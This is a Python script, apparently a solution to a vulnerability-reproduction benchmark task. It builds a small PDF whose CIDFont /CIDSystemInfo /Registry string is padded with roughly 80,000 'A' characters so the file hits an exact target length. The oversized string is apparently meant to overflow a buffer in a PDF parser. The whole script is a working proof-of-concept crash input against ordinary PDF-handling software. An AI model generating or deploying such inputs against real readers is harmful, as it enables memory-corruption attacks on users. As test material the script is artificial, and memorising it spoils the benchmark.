class Solution:
    def solve(self, src_path: str) -> bytes:
        # First pass: build with empty registry to compute base length
        empty_registry = b''
        cid_info_empty = b'<< /Registry (' + empty_registry + b') /Ordering (Identity) /Supplement 0 >>'
        font_obj_empty = b'5 0 obj\n<<\n/Type /Font\n/Subtype /CIDFontType0\n/BaseFont /UserDefined\n/CIDSystemInfo ' + cid_info_empty + b'\n/DW 1000\n>>\nendobj\n'
        
        header = b'%PDF-1.4\n%����\n'
        
        obj1 = b'1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n'
        
        obj2 = b'2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n'
        
        obj3 = b'3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources << /Font << /F1 5 0 R >> >>\n>>\nendobj\n'
        
        content = b'BT\n/F1 12 Tf\n100 700 Td\n(Hello) Tj\nET\n'
        stream_length = len(content)
        stream_obj = b'4 0 obj\n<< /Length ' + str(stream_length).encode() + b' >>\nstream\n' + content + b'\nendstream\nendobj\n'
        
        objects_empty = [obj1, obj2, obj3, stream_obj, font_obj_empty]
        
        pdf_parts_empty = [header]
        current_offset = len(header)
        offsets_empty = [0] * 6  # 0 unused
        for i, obj in enumerate(objects_empty, 1):
            offsets_empty[i] = current_offset
            pdf_parts_empty.append(obj)
            current_offset += len(obj)
        
        startxref_empty = current_offset
        num_objs = len(objects_empty) + 1
        xref_empty = b'xref\n0 ' + str(num_objs).encode() + b'\n'
        xref_empty += b'0000000000 65535 f \n'
        for i in range(1, num_objs):
            off_str = f"{offsets_empty[i]:010d}".encode()
            xref_empty += off_str + b' 00000 n \n'
        xref_empty += b'trailer\n<< /Size ' + str(num_objs).encode() + b' /Root 1 0 R >>\n'
        xref_empty += b'startxref\n' + str(startxref_empty).encode() + b'\n%%EOF\n'
        
        pdf_parts_empty.append(xref_empty)
        full_pdf_empty = b''.join(pdf_parts_empty)
        base_length = len(full_pdf_empty)
        
        target_length = 80064
        added_length = target_length - base_length
        if added_length < 0:
            added_length = 0
        registry = b'A' * added_length
        
        # Second pass: build with full registry
        cid_info = b'<< /Registry (' + registry + b') /Ordering (Identity) /Supplement 0 >>'
        font_obj = b'5 0 obj\n<<\n/Type /Font\n/Subtype /CIDFontType0\n/BaseFont /UserDefined\n/CIDSystemInfo ' + cid_info + b'\n/DW 1000\n>>\nendobj\n'
        
        objects = [obj1, obj2, obj3, stream_obj, font_obj]
        
        pdf_parts = [header]
        current_offset = len(header)
        offsets = [0] * 6
        for i, obj in enumerate(objects, 1):
            offsets[i] = current_offset
            pdf_parts.append(obj)
            current_offset += len(obj)
        
        startxref = current_offset
        xref = b'xref\n0 ' + str(num_objs).encode() + b'\n'
        xref += b'0000000000 65535 f \n'
        for i in range(1, num_objs):
            off_str = f"{offsets[i]:010d}".encode()
            xref += off_str + b' 00000 n \n'
        xref += b'trailer\n<< /Size ' + str(num_objs).encode() + b' /Root 1 0 R >>\n'
        xref += b'startxref\n' + str(startxref).encode() + b'\n%%EOF\n'
        
        pdf_parts.append(xref)
        full_pdf = b''.join(pdf_parts)
        
        return full_pdf